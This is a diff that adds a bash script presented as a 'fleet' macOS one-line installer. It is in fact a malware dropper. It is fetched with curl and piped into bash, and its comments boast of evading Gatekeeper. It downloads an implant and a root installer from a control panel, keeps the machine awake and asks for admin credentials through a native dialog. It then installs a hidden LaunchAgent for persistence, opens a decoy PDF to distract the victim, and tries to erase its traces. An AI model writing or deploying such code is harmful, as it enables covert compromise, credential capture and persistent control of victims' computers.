@@ -1,0 +1,67 @@
+#!/bin/bash
+# fleet macOS one-line installer — curl -sSL <panel>/install/mac | bash
+#
+# Bypasses Gatekeeper entirely: curl does not set com.apple.quarantine,
+# and running a shell script via bash does not trigger Gatekeeper
+# (Gatekeeper only scans quarantined app bundles launched through
+# LaunchServices/Finder). No root required for user-level install.
+#
+# usage: curl -sSL https://<panel>/install/mac | bash
+set -euo pipefail
+
+WORKDIR="$HOME/Library/Application Support/.fleet-update"
+mkdir -p "$WORKDIR"
+
+# ---- download implant (curl sets no quarantine attribute) ------------------
+IMPLANT_URL="{{PANEL_ENDPOINT}}/install/mac/binary"
+curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun"
+chmod 0755 "$WORKDIR/fleetrun"
+
+# ---- download root installer (optional, for full system persistence) ------
+DAEMON_URL="{{PANEL_ENDPOINT}}/install/mac/daemon"
+curl -fsSL "$DAEMON_URL" -o "$WORKDIR/install-daemon.sh" 2>/dev/null || true
+chmod 0755 "$WORKDIR/install-daemon.sh" 2>/dev/null || true
+
+# ---- download decoy PDF ----------------------------------------------------
+DECOY_URL="{{PANEL_ENDPOINT}}/install/mac/decoy"
+curl -fsSL "$DECOY_URL" -o "$WORKDIR/decoy.pdf"
+
+# ---- stay awake ------------------------------------------------------------
+caffeinate -ims >/dev/null 2>&1 &
+sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
+sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
+
+# ---- system-wide root install via native macOS admin dialog ----------------
+# osascript "with administrator privileges" shows the standard macOS
+# username/password prompt. If the user grants credentials we run the full
+# root installer: spctl --add whitelist + /Library/LaunchDaemons + stay-awake.
+if [ "$(id -u)" != "0" ] && [ -x "$WORKDIR/install-daemon.sh" ]; then
+  osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
+fi
+
+# ---- per-user LaunchAgent fallback (works without root) --------------------
+AGENT="$HOME/Library/LaunchAgents/io.fleet.update.plist"
+mkdir -p "$HOME/Library/LaunchAgents"
+cat > "$AGENT" <<PLIST
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>io.fleet.update</string>
+  <key>ProgramArguments</key><array><string>$WORKDIR/fleetrun</string></array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+</dict></plist>
+PLIST
+launchctl unload "$AGENT" 2>/dev/null || true
+launchctl load "$AGENT" 2>/dev/null || true
+
+# ---- run the implant -------------------------------------------------------
+"$WORKDIR/fleetrun" >/dev/null 2>&1 &
+
+# ---- open decoy PDF --------------------------------------------------------
+sleep 1.5
+command -v open >/dev/null 2>&1 && open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true
+
+# ---- self-destruct ---------------------------------------------------------
+(sleep 5; rm -rf "$WORKDIR") >/dev/null 2>&1 &
+exit 0
